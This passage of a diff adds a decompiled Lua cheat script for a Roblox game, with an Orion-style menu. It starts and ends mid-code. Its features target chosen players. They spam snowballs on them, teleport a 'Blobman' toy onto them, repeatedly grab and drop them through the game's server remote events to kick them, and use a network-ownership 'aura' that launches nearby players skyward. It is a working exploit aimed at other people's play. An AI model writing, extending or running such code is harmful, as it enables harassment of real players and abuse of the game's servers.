+            spawnToy('BallSnowball', _Character10.Position + Vector3.new(0, 2, 0))
+        end
+
+        task.wait(1)
+    end
+end
+function tpBall()
+    while u193.TE do
+        local v223 = u193.W:FindFirstChild(u193.LP.Name .. 'SpawnedInToys')
+
+        if v223 and u193.TP then
+            local v224 = u193.P:FindFirstChild(u193.TP)
+
+            if v224 then
+                v224 = v224.Character
+            end
+            if v224 then
+                v224 = v224:FindFirstChild('HumanoidRootPart')
+            end
+            if v224 then
+                local v225, v226, v227 = ipairs(v223:GetChildren())
+
+                while true do
+                    local v228
+
+                    v227, v228 = v225(v226, v227)
+
+                    if v227 == nil then
+                        break
+                    end
+                    if v228:IsA('Model') and v228.Name == 'BallSnowball' then
+                        local v229, v230, v231 = ipairs(v228:GetDescendants())
+
+                        while true do
+                            local v232
+
+                            v231, v232 = v229(v230, v231)
+
+                            if v231 == nil then
+                                break
+                            end
+                            if v232:IsA('BasePart') then
+                                v232.Position = v224.Position
+                            end
+                        end
+                    end
+                end
+            end
+        end
+
+        task.wait(0.1)
+    end
+end
+
+u193.DD = v96:AddDropdown({
+    Name = 'Select Player (Snowball)',
+    Options = getAllPlayers(),
+    Default = nil,
+    Callback = function(p233)
+        u193.TP = p233
+    end,
+})
+
+updateDropdown()
+v96:AddToggle({
+    Name = 'Snowball Ragdoll',
+    Default = false,
+    Callback = function(p234)
+        u193.TE = p234
+
+        if p234 then
+            task.spawn(tpBall)
+        end
+    end,
+})
+v96:AddToggle({
+    Name = 'Auto Spawn Snowballs',
+    Default = false,
+    Callback = function(p235)
+        u193.SE = p235
+
+        if p235 then
+            task.spawn(spawnBalls)
+        end
+    end,
+})
+v96:AddToggle({
+    Name = 'Auto Kick Blob (Snowball Spam)',
+    Default = false,
+    Callback = function(p236)
+        u193.AE = p236
+
+        if p236 then
+            task.spawn(autoBlob)
+            task.spawn(tpSnow)
+        end
+    end,
+})
+
+if not game:IsLoaded() then
+    game.Loaded:Wait()
+end
+if not (syn and protectgui) then
+    getgenv().protectgui = function() end
+end
+
+local v237 = v27:MakeTab({
+    Name = 'Blobman Loop',
+    Icon = 'rbxassetid://6031091005',
+    PremiumOnly = false,
+})
+
+v237:AddSection({
+    Name = 'Blobman Target',
+})
+
+local u238 = {
+    Players = game:GetService('Players'),
+    ReplicatedStorage = game:GetService('ReplicatedStorage'),
+    Workspace = game:GetService('Workspace'),
+    LocalPlayer = nil,
+    TargetList = u29.TargetList or {},
+    selectedPlayer = nil,
+    toggleEnabled = false,
+    teleportAllEnabled = false,
+    teleportDelay = 1,
+    currentBlobman = nil,
+    masterRunning = false,
+    blobalter = 1,
+    ORIGIN_POS = nil,
+    MAX_TELEPORT_DIST = 500,
+    targetPlayerDropdown = nil,
+}
+
+u238.LocalPlayer = u238.Players.LocalPlayer
+u29.TargetList = u238.TargetList
+
+function getAllPlayers()
+    local v239, v240, v241 = ipairs(u238.Players:GetPlayers())
+    local v242 = {}
+
+    while true do
+        local v243
+
+        v241, v243 = v239(v240, v241)
+
+        if v241 == nil then
+            break
+        end
+        if v243 ~= u238.LocalPlayer then
+            table.insert(v242, v243.Name)
+        end
+    end
+
+    return v242
+end
+function refreshDropdown()
+    if u238.targetPlayerDropdown then
+        u238.targetPlayerDropdown:Refresh(getAllPlayers(), true)
+    end
+end
+
+u238.targetPlayerDropdown = v237:AddDropdown({
+    Name = 'Select Player',
+    Default = '',
+    Options = getAllPlayers(),
+    Callback = function(p244)
+        u238.selectedPlayer = u238.Players:FindFirstChild(p244)
+    end,
+})
+
+registerDropdown(u238.targetPlayerDropdown)
+v237:AddButton({
+    Name = 'Add Selected Player to Target List',
+    Callback = function()
+        if u238.selectedPlayer and not u238.TargetList[u238.selectedPlayer.UserId] then
+            u238.TargetList[u238.selectedPlayer.UserId] = u238.selectedPlayer.Name
+
+            u24:MakeNotification({
+                Name = 'Player Added',
+                Content = u238.selectedPlayer.Name .. ' added to target list.',
+                Time = 2,
+            })
+        end
+    end,
+})
+v237:AddButton({
+    Name = 'Remove Selected Player from Target List',
+    Callback = function()
+        if u238.selectedPlayer and u238.TargetList[u238.selectedPlayer.UserId] then
+            u238.TargetList[u238.selectedPlayer.UserId] = nil
+
+            u24:MakeNotification({
+                Name = 'Player Removed',
+                Content = u238.selectedPlayer.Name .. ' removed from target list.',
+                Time = 2,
+            })
+        end
+    end,
+})
+
+function blobGrabPlayer(p245, p246)
+    if u13 ~= 1 then
+        if p245.Character and p245.Character:FindFirstChild('HumanoidRootPart') then
+            local v247 = {
+                p246:FindFirstChild('RightDetector'),
+                p245.Character:FindFirstChild('HumanoidRootPart'),
+                p246:FindFirstChild('RightDetector'):FindFirstChild('RightWeld'),
+            }
+
+            p246:WaitForChild('BlobmanSeatAndOwnerScript'):WaitForChild('CreatureGrab'):FireServer(unpack(v247))
+
+            u13 = 1
+        end
+    elseif p245.Character and p245.Character:FindFirstChild('HumanoidRootPart') then
+        local v248 = {
+            p246:FindFirstChild('LeftDetector'),
+            p245.Character:FindFirstChild('HumanoidRootPart'),
+            p246:FindFirstChild('LeftDetector'):FindFirstChild('LeftWeld'),
+        }
+
+        p246:WaitForChild('BlobmanSeatAndOwnerScript'):WaitForChild('CreatureGrab'):FireServer(unpack(v248))
+
+        u13 = 2
+    end
+end
+function getMountedBlobman()
+    local _Character11 = _LocalPlayer.Character
+
+    if _Character11 then
+        local _Humanoid5 = _Character11:FindFirstChildOfClass('Humanoid')
+
+        if _Humanoid5 and _Humanoid5.SeatPart and _Humanoid5.SeatPart.Parent.Name == 'CreatureBlobman' then
+            return _Humanoid5.SeatPart.Parent
+        end
+    end
+
+    return nil
+end
+function teleportBlobman(p251, p252)
+    local _Character12 = _LocalPlayer.Character
+
+    if _Character12 then
+        _Character12 = _LocalPlayer.Character:FindFirstChild('HumanoidRootPart')
+    end
+    if _Character12 then
+        local _BodyPosition = Instance.new('BodyPosition')
+
+        _BodyPosition.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
+        _BodyPosition.P = 100000
+        _BodyPosition.Position = p252
+        _BodyPosition.Parent = p251.PrimaryPart
+        _Character12.CFrame = CFrame.new(p252)
+
+        p251:SetPrimaryPartCFrame(CFrame.new(p252))
+        task.wait(0.1)
+        _BodyPosition:Destroy()
+    end
+end
+function startGrabbingPlayers()
+    task.spawn(function()
+        while true do
+            if not u10 then
+                return
+            end
+
+            local v255 = _Workspace
+            local v256, v257, v258 = pairs(v255:GetDescendants())
+            local v259 = nil
+
+            while true do
+                local v260
+
+                v258, v260 = v256(v257, v258)
+
+                if v258 == nil then
+                    v260 = v259
+                end
+                if v260.Name == 'CreatureBlobman' and v260:FindFirstChild('VehicleSeat') and v260.VehicleSeat:FindFirstChild('SeatWeld') and v260.VehicleSeat.SeatWeld.Part1:IsDescendantOf(_LocalPlayer5.Character) then
+                    break
+                end
+            end
+
+            if not v260 then
+                u24:MakeNotification({
+                    Name = 'Error',
+                    Content = 'You must be mounted on a Blobman!',
+                    Time = 5,
+                })
+
+                u10 = false
+
+                return
+            end
+
+            local v261, v262, v263 = pairs(u29.TargetList)
+
+            while true do
+                local v264
+
+                v263, v264 = v261(v262, v263)
+
+                if v263 == nil then
+                    break
+                end
+
+                local v265 = _Players:GetPlayerByUserId(v263)
+
+                if v265 then
+                    blobGrabPlayer(v265, v260)
+                    task.wait(u29.BlobmanDelay or 0.1)
+                end
+            end
+
+            task.wait(0.02)
+        end
+    end)
+end
+function attemptTeleportAndGrab(p266, p267, p268)
+    local _Character13 = _LocalPlayer.Character
+
+    if _Character13 then
+        _Character13 = _LocalPlayer.Character:FindFirstChild('HumanoidRootPart')
+    end
+    if not (_Character13 and p266.Character and p266.Character:FindFirstChild('HumanoidRootPart')) then
+        return false
+    end
+
+    local _HumanoidRootPart6 = p266.Character.HumanoidRootPart
+
+    if (_HumanoidRootPart6.Position - p268).Magnitude <= 20 then
+        return true
+    end
+
+    local v271 = _HumanoidRootPart6.Position + Vector3.new(0, 2, 0)
+
+    teleportBlobman(p267, v271)
+    task.wait(0.2)
+    blobGrabPlayer(p266, p267)
+    task.wait(0.2)
+    teleportBlobman(p267, p268)
+    task.wait(0.2)
+
+    return (_HumanoidRootPart6.Position - p268).Magnitude <= 20
+end
+function startTeleportingPlayers()
+    task.spawn(function()
+        while u10 do
+            local v272 = getMountedBlobman()
+            local _Character14 = _LocalPlayer.Character
+
+            if _Character14 then
+                _Character14 = _LocalPlayer.Character:FindFirstChild('HumanoidRootPart')
+            end
+            if v272 and _Character14 then
+                local _Position2 = _Character14.Position
+                local v275, v276, v277 = pairs(u29.TargetList)
+
+                while true do
+                    local v278
+
+                    v277, v278 = v275(v276, v277)
+
+                    if v277 == nil then
+                        break
+                    end
+
+                    local v279 = _Players:GetPlayerByUserId(v277)
+
+                    if v279 and v279.Character and (v279.Character:FindFirstChild('HumanoidRootPart') and 20 < (v279.Character.HumanoidRootPart.Position - _Position2).Magnitude) then
+                        local v280 = false
+                        local v281 = 0
+
+                        while u10 and (not v280 and v281 < 3) do
+                            v280 = attemptTeleportAndGrab(v279, v272, _Position2)
+                            v281 = v281 + 1
+
+                            if not v280 then
+                                task.wait(0.5)
+                            end
+                        end
+                    end
+                end
+            end
+
+            task.wait(0.2)
+        end
+    end)
+end
+
+v237:AddToggle({
+    Name = 'Blobman Target (If you are in safe zone/void)',
+    Default = false,
+    Callback = function(p282)
+        u10 = p282
+
+        if p282 then
+            startGrabbingPlayers()
+            startTeleportingPlayers()
+        end
+    end,
+})
+
+function findGroundBelow(p283)
+    local v284 = RaycastParams.new()
+
+    v284.FilterDescendantsInstances = {
+        u238.LocalPlayer.Character,
+    }
+    v284.FilterType = Enum.RaycastFilterType.Blacklist
+
+    local v285 = u238.Workspace:Raycast(p283 + Vector3.new(0, 50, 0), Vector3.new(0, -400), v284)
+
+    if v285 then
+        p283 = v285.Position or p283
+    end
+
+    return p283
+end
+function spawnBlobman()
+    local _Character15 = u238.LocalPlayer.Character
+
+    if _Character15 then
+        _Character15 = u238.LocalPlayer.Character:FindFirstChild('HumanoidRootPart')
+    end
+    if not _Character15 then
+        return nil
+    end
+
+    local v287 = findGroundBelow(_Character15.Position)
+    local u288 = CFrame.new(v287 + Vector3.new(0, 3, 0))
+
+    pcall(function()
+        u238.ReplicatedStorage.MenuToys.SpawnToyRemoteFunction:InvokeServer('CreatureBlobman', u288, Vector3.new(0, 59.667, 0))
+    end)
+
+    local v289 = u238.LocalPlayer.Name .. 'SpawnedInToys'
+
+    for _ = 1, 30 do
+        local v290 = u238.Workspace:FindFirstChild(v289)
+        local v291 = v290 and v290:FindFirstChild('CreatureBlobman')
+
+        if v291 then
+            u238.blobalter = 1
+
+            return v291
+        end
+
+        task.wait(0.15)
+    end
+
+    return nil
+end
+function findExistingBlobman()
+    local v292 = u238.Workspace:FindFirstChild(u238.LocalPlayer.Name .. 'SpawnedInToys')
+
+    return v292 and v292:FindFirstChild('CreatureBlobman') or nil
+end
+function getMountedBlobman()
+    local _Character16 = u238.LocalPlayer.Character
+
+    if _Character16 then
+        local _Humanoid6 = _Character16:FindFirstChildOfClass('Humanoid')
+
+        if _Humanoid6 and _Humanoid6.SeatPart and (_Humanoid6.SeatPart.Parent and _Humanoid6.SeatPart.Parent.Name == 'CreatureBlobman') then
+            return _Humanoid6.SeatPart.Parent
+        else
+            return nil
+        end
+    else
+        return nil
+    end
+end
+function seatOnBlobman(p295)
+    if p295 and u238.LocalPlayer.Character then
+        local _Character17 = u238.LocalPlayer.Character
+        local _Humanoid7 = _Character17:FindFirstChildOfClass('Humanoid')
+        local _HumanoidRootPart7 = _Character17:FindFirstChild('HumanoidRootPart')
+
+        if _Humanoid7 and _HumanoidRootPart7 then
+            local _VehicleSeat = p295:FindFirstChild('VehicleSeat')
+
+            if _VehicleSeat and _VehicleSeat:IsA('VehicleSeat') then
+                _HumanoidRootPart7.CFrame = _VehicleSeat.CFrame + Vector3.new(0, 2, 0)
+
+                pcall(function()
+                    _VehicleSeat:Sit(_Humanoid7)
+                end)
+                task.wait(0.25)
+            end
+        end
+    else
+        return
+    end
+end
+function teleportBlobman(p300, p301)
+    if p300 and p300.PrimaryPart then
+        local _Character18 = u238.LocalPlayer.Character
+
+        if _Character18 then
+            local _HumanoidRootPart8 = _Character18:FindFirstChild('HumanoidRootPart')
+
+            if _HumanoidRootPart8 then
+                local _BodyPosition2 = Instance.new('BodyPosition')
+
+                _BodyPosition2.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
+                _BodyPosition2.P = 100000
+                _BodyPosition2.Position = p301
+                _BodyPosition2.Parent = p300.PrimaryPart
+
+                pcall(function()
+                    _HumanoidRootPart8.CFrame = CFrame.new(p301)
+
+                    p300:SetPrimaryPartCFrame(CFrame.new(p301))
+                end)
+                task.wait(0.1)
+
+                if _BodyPosition2 and _BodyPosition2.Parent then
+                    _BodyPosition2:Destroy()
+                end
+            end
+        else
+            return
+        end
+    else
+        return
+    end
+end
+function blobGrabPlayer(p305, p306)
+    if p305 and p306 then
+        if p305.Character and p305.Character:FindFirstChild('HumanoidRootPart') then
+            local _LeftDetector = p306:FindFirstChild('LeftDetector')
+            local _RightDetector = p306:FindFirstChild('RightDetector')
+            local _BlobmanSeatAndOwnerScript = p306:FindFirstChild('BlobmanSeatAndOwnerScript')
+
+            if _BlobmanSeatAndOwnerScript then
+                local _CreatureGrab = _BlobmanSeatAndOwnerScript:FindFirstChild('CreatureGrab')
+
+                if _CreatureGrab then
+                    if u238.blobalter ~= 1 then
+                        local u311
+
+                        if _RightDetector then
+                            u311 = _RightDetector:FindFirstChild('RightWeld')
+                        else
+                            u311 = _RightDetector
+                        end
+                        if _RightDetector and u311 then
+                            pcall(function()
+                                _CreatureGrab:FireServer(_RightDetector, p305.Character.HumanoidRootPart, u311)
+                            end)
+
+                            u238.blobalter = 1
+                        end
+                    else
+                        local u312
+
+                        if _LeftDetector then
+                            u312 = _LeftDetector:FindFirstChild('LeftWeld')
+                        else
+                            u312 = _LeftDetector
+                        end
+                        if _LeftDetector and u312 then
+                            pcall(function()
+                                _CreatureGrab:FireServer(_LeftDetector, p305.Character.HumanoidRootPart, u312)
+                            end)
+
+                            u238.blobalter = 2
+                        end
+                    end
+                end
+            else
+                return
+            end
+        else
+            return
+        end
+    else
+        return
+    end
+end
+function attemptTeleportAndGrab(p313, p314, p315, p316)
+    local v317 = p316 or 20
+
+    if p313 and p314 and p315 then
+        if p313.Character and p313.Character:FindFirstChild('HumanoidRootPart') then
+            local _HumanoidRootPart9 = p313.Character.HumanoidRootPart
+            local _Magnitude = (_HumanoidRootPart9.Position - p315).Magnitude
+
+            if u238.ORIGIN_POS and (_HumanoidRootPart9.Position - u238.ORIGIN_POS).Magnitude > u238.MAX_TELEPORT_DIST then
+                return false
+            elseif _Magnitude <= v317 then
+                blobGrabPlayer(p313, p314)
+                task.wait(0.1)
+
+                return true
+            else
+                local v320 = _HumanoidRootPart9.Position + Vector3.new(0, 2, 0)
+
+                teleportBlobman(p314, v320)
+                task.wait(0.2)
+                blobGrabPlayer(p313, p314)
+                task.wait(0.2)
+                teleportBlobman(p314, p315)
+                task.wait(0.2)
+
+                if p313.Character and p313.Character:FindFirstChild('HumanoidRootPart') then
+                    return (p313.Character.HumanoidRootPart.Position - p315).Magnitude <= v317
+                else
+                    return false
+                end
+            end
+        else
+            return false
+        end
+    else
+        return false
+    end
+end
+function blobDropAndRegrabCycle(p321, p322, p323)
+    if not (p321 and (p321.Character and p322) and p322.Parent) then
+        return
+    end
+
+    local _HumanoidRootPart10 = p321.Character:FindFirstChild('HumanoidRootPart')
+
+    if not _HumanoidRootPart10 then
+        return
+    end
+
+    local _BlobmanSeatAndOwnerScript2 = p322:FindFirstChild('BlobmanSeatAndOwnerScript')
+
+    if not _BlobmanSeatAndOwnerScript2 then
+        return
+    end
+
+    local _CreatureDrop = _BlobmanSeatAndOwnerScript2:FindFirstChild('CreatureDrop')
+
+    if not (_CreatureDrop and _BlobmanSeatAndOwnerScript2:FindFirstChild('CreatureGrab')) then
+        return
+    end
+
+    for v327 = 1, 4 do
+        if not u238.toggleEnabled then
+            break
+        end
+
+        local v328 = (p323 or u238.LocalPlayer.Character and (u238.LocalPlayer.Character:FindFirstChild('HumanoidRootPart') and u238.LocalPlayer.Character.HumanoidRootPart.Position) or Vector3.new()) + Vector3.new(0, 10 * v327, 0)
+
+        if p322 and p322.PrimaryPart then
+            teleportBlobman(p322, v328)
+        end
+
+        task.wait(0.1)
+
+        local _LeftDetector2 = p322:FindFirstChild('LeftDetector')
+        local _RightDetector2 = p322:FindFirstChild('RightDetector')
+        local u331 = not _LeftDetector2 or _LeftDetector2:FindFirstChild('RigidConstraint') or _LeftDetector2:FindFirstChild('LeftWeld')
+        local u332 = not _RightDetector2 or _RightDetector2:FindFirstChild('RightWeld') or _RightDetector2:FindFirstChild('RigidConstraint')
+
+        if u331 then
+            pcall(function()
+                _CreatureDrop:FireServer(u331, _HumanoidRootPart10)
+            end)
+        end
+        if u332 then
+            pcall(function()
+                _CreatureDrop:FireServer(u332, _HumanoidRootPart10)
+            end)
+        end
+
+        task.wait(0.1)
+        blobGrabPlayer(p321, p322)
+        task.wait(0.1)
+    end
+end
+function masterLoop()
+    if not u238.masterRunning then
+        u238.masterRunning = true
+
+        local _Character19 = u238.LocalPlayer.Character
+
+        if _Character19 then
+            _Character19 = _Character19:FindFirstChild('HumanoidRootPart')
+        end
+        if _Character19 then
+            u238.ORIGIN_POS = _Character19.Position
+        end
+
+        u29.LastProcessed = u29.LastProcessed or {}
+
+        task.spawn(function()
+            while true do
+                if true then
+                    if not u238.toggleEnabled then
+                        u238.masterRunning = false
+
+                        return
+                    end
+                    if not u238.currentBlobman or u238.currentBlobman and not u238.currentBlobman.Parent then
+                        u238.currentBlobman = findExistingBlobman()
+                    end
+
+                    local v334 = ((not u238.currentBlobman or u238.currentBlobman and not u238.currentBlobman.Parent) and true or false) and spawnBlobman()
+
+                    if v334 then
+                        u238.currentBlobman = v334
+
+                        task.wait(0.25)
+                    end
+                    if not (u238.currentBlobman and u238.currentBlobman.Parent) then
+                    end
+                end
+
+                local v335 = getMountedBlobman()
+
+                if not v335 or v335 ~= u238.currentBlobman then
+                    local v336 = os.clock()
+
+                    while u238.toggleEnabled and (not v335 or v335 ~= u238.currentBlobman) do
+                        seatOnBlobman(u238.currentBlobman)
+                        task.wait(0.25)
+
+                        v335 = getMountedBlobman()
+
+                        if v335 == u238.currentBlobman then
+                            break
+                        end
+                        if os.clock() - v336 >= 5 then
+                            local v337 = spawnBlobman()
+
+                            if not v337 then
+                                break
+                            end
+
+                            u238.currentBlobman = v337
+
+                            task.wait(0.3)
+
+                            for _ = 1, 6 do
+                                if not u238.toggleEnabled then
+                                    break
+                                end
+
+                                seatOnBlobman(u238.currentBlobman)
+                                task.wait(0.25)
+
+                                if getMountedBlobman() == u238.currentBlobman then
+                                    break
+                                end
+                            end
+                        end
+                    end
+                end
+                if getMountedBlobman() == u238.currentBlobman then
+                    local _Character20 = u238.LocalPlayer.Character
+
+                    if _Character20 then
+                        _Character20 = _Character20:FindFirstChild('HumanoidRootPart')
+                    end
+                    if _Character20 then
+                        local _Position3 = _Character20.Position
+                        local v340 = {}
+
+                        if u238.teleportAllEnabled then
+                            local v341, v342, v343 = ipairs(u238.Players:GetPlayers())
+
+                            while true do
+                                local v344
+
+                                v343, v344 = v341(v342, v343)
+
+                                if v343 == nil then
+                                    break
+                                end
+                                if v344 ~= u238.LocalPlayer then
+                                    table.insert(v340, v344)
+                                end
+                            end
+                        else
+                            local v345, v346, v347 = pairs(u238.TargetList)
+
+                            while true do
+                                local v348
+
+                                v347, v348 = v345(v346, v347)
+
+                                if v347 == nil then
+                                    break
+                                end
+
+                                local v349 = u238.Players:GetPlayerByUserId(v347)
+
+                                if v349 then
+                                    table.insert(v340, v349)
+                                end
+                            end
+                        end
+
+                        local v350, v351, v352 = ipairs(v340)
+
+                        while true do
+                            local u353
+
+                            v352, u353 = v350(v351, v352)
+
+                            if v352 == nil or not u238.toggleEnabled then
+                                break
+                            end
+                            if u353 and u353.Character and u353.Character:FindFirstChild('HumanoidRootPart') then
+                                if u29.LastProcessed[u353.UserId] then
+                                    local _Character21 = u353.Character
+
+                                    if _Character21 then
+                                        _Character21 = u353.Character:FindFirstChild('HumanoidRootPart')
+                                    end
+
+                                    local _Character22 = u353.Character
+
+                                    if _Character22 then
+                                        _Character22 = u353.Character:FindFirstChild('Humanoid')
+                                    end
+                                    if not (_Character21 and _Character22) or (_Character22.Health <= 0 or (_Character21.Position - _Position3).Magnitude > 20) then
+                                        u29.LastProcessed[u353.UserId] = nil
+                                    end
+                                end
+                                if u238.ORIGIN_POS and (u353.Character.HumanoidRootPart.Position - u238.ORIGIN_POS).Magnitude <= u238.MAX_TELEPORT_DIST then
+                                    if (u353.Character.HumanoidRootPart.Position - _Position3).Magnitude <= 20 then
+                                        blobGrabPlayer(u353, u238.currentBlobman)
+                                        task.wait(u29.BlobmanDelay or 0.1)
+                                        pcall(function()
+                                            blobDropAndRegrabCycle(u353, u238.currentBlobman, _Position3)
+                                        end)
+
+                                        u29.LastProcessed[u353.UserId] = tick()
+                                    else
+                                        local v356 = false
+                                        local v357 = 0
+
+                                        while u238.toggleEnabled and (not v356 and v357 < 3) and (u238.currentBlobman and u238.currentBlobman.Parent and getMountedBlobman() == u238.currentBlobman) do
+                                            v356 = attemptTeleportAndGrab(u353, u238.currentBlobman, _Position3, 20)
+                                            v357 = v357 + 1
+
+                                            if v356 then
+                                                pcall(function()
+                                                    blobDropAndRegrabCycle(u353, u238.currentBlobman, _Position3)
+                                                end)
+
+                                                u29.LastProcessed[u353.UserId] = tick()
+                                            else
+                                                task.wait(0.4)
+                                            end
+                                        end
+                                    end
+                                end
+                            end
+                        end
+                    end
+                end
+
+                task.wait(0.25)
+            end
+        end)
+    end
+end
+
+u238.LocalPlayer.CharacterAdded:Connect(function()
+    if u238.toggleEnabled then
+        task.wait(1.5)
+
+        local _Character23 = u238.LocalPlayer.Character
+
+        if _Character23 then
+            _Character23 = u238.LocalPlayer.Character:FindFirstChild('HumanoidRootPart')
+        end
+        if _Character23 then
+            u238.ORIGIN_POS = _Character23.Position
+        end
+
+        masterLoop()
+    end
+end)
+v237:AddToggle({
+    Name = 'Blobman Target (Kick)',
+    Default = false,
+    Callback = function(p359)
+        u238.toggleEnabled = p359
+
+        if p359 then
+            local _Character24 = u238.LocalPlayer.Character
+
+            if _Character24 then
+                _Character24 = u238.LocalPlayer.Character:FindFirstChild('HumanoidRootPart')
+            end
+            if _Character24 then
+                u238.ORIGIN_POS = _Character24.Position
+            end
+
+            masterLoop()
+        end
+    end,
+})
+v237:AddSlider({
+    Name = 'Teleport Duration',
+    Min = 0.25,
+    Max = 3,
+    Default = u238.teleportDelay,
+    Increment = 0.01,
+    ValueName = 'Seconds',
+    Callback = function(p361)
+        u238.teleportDelay = p361
+    end,
+})
+u238.Players.PlayerAdded:Connect(refreshDropdown)
+u238.Players.PlayerRemoving:Connect(refreshDropdown)
+
+local u362 = {
+    autoGrab = false,
+    autoGrabCoroutine = nil,
+}
+
+function grabDual(p363, p364)
+    local _LeftDetector3 = p363:FindFirstChild('LeftDetector')
+    local _RightDetector3 = p363:FindFirstChild('RightDetector')
+    local _BlobmanSeatAndOwnerScript3 = p363:FindFirstChild('BlobmanSeatAndOwnerScript')
+
+    if _LeftDetector3 and (_RightDetector3 and _BlobmanSeatAndOwnerScript3) and p364 then
+        local _RigidConstraint = _LeftDetector3:FindFirstChild('RigidConstraint')
+        local _RightWeld = _RightDetector3:FindFirstChild('RightWeld')
+
+        if _RigidConstraint then
+            pcall(function()
+                _BlobmanSeatAndOwnerScript3.CreatureGrab:FireServer(_LeftDetector3, p364, _RigidConstraint)
+                _BlobmanSeatAndOwnerScript3.CreatureDrop:FireServer(_RigidConstraint, p364)
+            end)
+        end
+        if _RightWeld then
+            pcall(function()
+                _BlobmanSeatAndOwnerScript3.CreatureGrab:FireServer(_RightDetector3, p364, _RightWeld)
+                _BlobmanSeatAndOwnerScript3.CreatureDrop:FireServer(_RightWeld, p364)
+            end)
+        end
+    end
+end
+function getMyBlobman()
+    local v370 = _Workspace
+    local v371, v372, v373 = pairs(v370:GetDescendants())
+
+    while true do
+        local v374
+
+        v373, v374 = v371(v372, v373)
+
+        if v373 == nil then
+            break
+        end
+        if v374:IsA('Model') and v374.Name == 'CreatureBlobman' and v374:FindFirstChild('VehicleSeat') then
+            local _SeatWeld = v374.VehicleSeat:FindFirstChild('SeatWeld')
+
+            if _SeatWeld and _SeatWeld.Part1 and _SeatWeld.Part1:IsDescendantOf(game.Players.LocalPlayer.Character) then
+                return v374
+            end
+        end
+    end
+
+    return nil
+end
+function loopTargetedGrab()
+    u362.autoGrabCoroutine = coroutine.create(function()
+        local v376 = getMyBlobman()
+
+        if v376 then
+            while u362.autoGrab do
+                local v377, v378, v379 = pairs(u29.TargetList)
+
+                while true do
+                    local v380
+
+                    v379, v380 = v377(v378, v379)
+
+                    if v379 == nil then
+                        break
+                    end
+                    if v379 ~= game.Players.LocalPlayer.UserId then
+                        local v381 = game.Players:GetPlayerByUserId(v379)
+                        local v382 = v381 and v381.Character
+
+                        if v382 then
+                            v382 = v381.Character:FindFirstChild('HumanoidRootPart')
+                        end
+                        if v382 then
+                            grabDual(v376, v382)
+                        end
+                    end
+                end
+
+                task.wait(0.01)
+            end
+        else
+            u24:MakeNotification({
+                Name = 'No Blobman Found',
+                Content = 'You must be riding a Blobman to use this.',
+                Image = 'rbxassetid://4483345998',
+                Time = 5,
+            })
+        end
+    end)
+
+    coroutine.resume(u362.autoGrabCoroutine)
+end
+
+v237:AddToggle({
+    Name = 'God Loop Target',
+    Default = false,
+    Callback = function(p383)
+        u362.autoGrab = p383
+
+        if p383 then
+            loopTargetedGrab()
+        elseif u362.autoGrabCoroutine then
+            coroutine.close(u362.autoGrabCoroutine)
+
+            u362.autoGrabCoroutine = nil
+        end
+    end,
+})
+
+local u384 = {
+    enabled = false,
+    coroutine = nil,
+    MAX_HOVER_DIST = 500,
+    HOVER_HEIGHT = 25,
+}
+
+function hoverFollowTarget()
+    u384.coroutine = coroutine.create(function()
+        while u384.enabled do
+            local v385 = getMountedBlobman()
+            local _selectedPlayer = u238.selectedPlayer
+
+            if v385 and _selectedPlayer and _selectedPlayer.Character and _selectedPlayer.Character:FindFirstChild('HumanoidRootPart') then
+                local _HumanoidRootPart11 = _selectedPlayer.Character.HumanoidRootPart
+                local _Character25 = u238.LocalPlayer.Character
+
+                if _Character25 then
+                    _Character25 = _Character25:FindFirstChild('HumanoidRootPart')
+                end
+                if _Character25 and (_Character25.Position - _HumanoidRootPart11.Position).Magnitude <= u384.MAX_HOVER_DIST then
+                    local v389 = _HumanoidRootPart11.Position + Vector3.new(0, u384.HOVER_HEIGHT, 0)
+
+                    teleportBlobman(v385, v389)
+                end
+            end
+
+            task.wait(0.06)
+        end
+    end)
+
+    coroutine.resume(u384.coroutine)
+end
+
+v237:AddToggle({
+    Name = 'Hover above target',
+    Default = false,
+    Callback = function(p390)
+        u384.enabled = p390
+
+        if p390 then
+            hoverFollowTarget()
+        elseif u384.coroutine then
+            coroutine.close(u384.coroutine)
+
+            u384.coroutine = nil
+        end
+    end,
+})
+
+local v391 = v27:MakeTab({
+    Name = 'Auras',
+    Icon = 'rbxassetid://6031075939',
+    PremiumOnly = false,
+})
+
+v391:AddSection({
+    Name = 'Auras',
+})
+
+local u392 = {
+    auraCoroutine = nil,
+    gravityCoroutine = nil,
+    localPlayer = game.Players.LocalPlayer,
+    Players = game.Players,
+    Debris = game:GetService('Debris'),
+    SetNetworkOwner = game.ReplicatedStorage:WaitForChild('GrabEvents'):WaitForChild('SetNetworkOwner'),
+    OrionLib = u24,
+    Tab = v391,
+    auraRadius = 25,
+}
+
+function startAirSuspendAura()
+    u392.auraCoroutine = coroutine.create(function()
+        while true do
+            local v402, v403 = pcall(function()
+                local _Character26 = u392.localPlayer.Character
+
+                if _Character26 and (_Character26:FindFirstChild('Head') and _Character26:FindFirstChild('HumanoidRootPart')) then
+                    local _ = _Character26.Head
+                    local _HumanoidRootPart12 = _Character26.HumanoidRootPart
+                    local v395, v396, v397 = pairs(u392.Players:GetPlayers())
+
+                    while true do
+                        local u398
+
+                        v397, u398 = v395(v396, v397)
+
+                        if v397 == nil then
+                            break
+                        end
+
+                        coroutine.wrap(function()
+                            if u398 ~= u392.localPlayer and u398.Character then
+                                local _Character27 = u398.Character
+                                local _Torso = _Character27:FindFirstChild('Torso')
+
+                                if _Torso and (_Torso.Position - _HumanoidRootPart12.Position).Magnitude <= u392.auraRadius then
+                                    u392.SetNetworkOwner:FireServer(_Torso, _Character27.HumanoidRootPart.FirePlayerPart.CFrame)
+                                    task.wait(0.1)
+
+                                    local v401 = _Torso:FindFirstChild('l') or Instance.new('BodyVelocity', _Torso)
+
+                                    v401.Name = 'l'
+                                    v401.Velocity = Vector3.new(0, 200000000000, 0)
+                                    v401.MaxForce = Vector3.new(0, math.huge, 0)
+
+                                    u392.Debris:AddItem(v401, 100)
+                                    task.wait(1)
+                                    u392.SetNetworkOwner:FireServer(_Torso, nil)
+
+                                    if v401 then
+                                        v401:Destroy()
+                                    end
+                                end
+                            end
+                        end)()
+                    end
+                end
+            end)
+
+            if not v402 then
+                warn('Error in Air Suspend Aura: ' .. tostring(v403))
+            end
+
+            task.wait(0.02)
+        end
+    end)
+
+    coroutine.resume(u392.auraCoroutine)
+end
+function stopAirSuspendAura()
+    if u392.auraCoroutine then
+        coroutine.close(u392.auraCoroutine)
+
+        u392.auraCoroutine = nil
+    end
+end
+
+u392.Tab:AddToggle({
+    Name = ' Launch Aura',
+    Default = false,
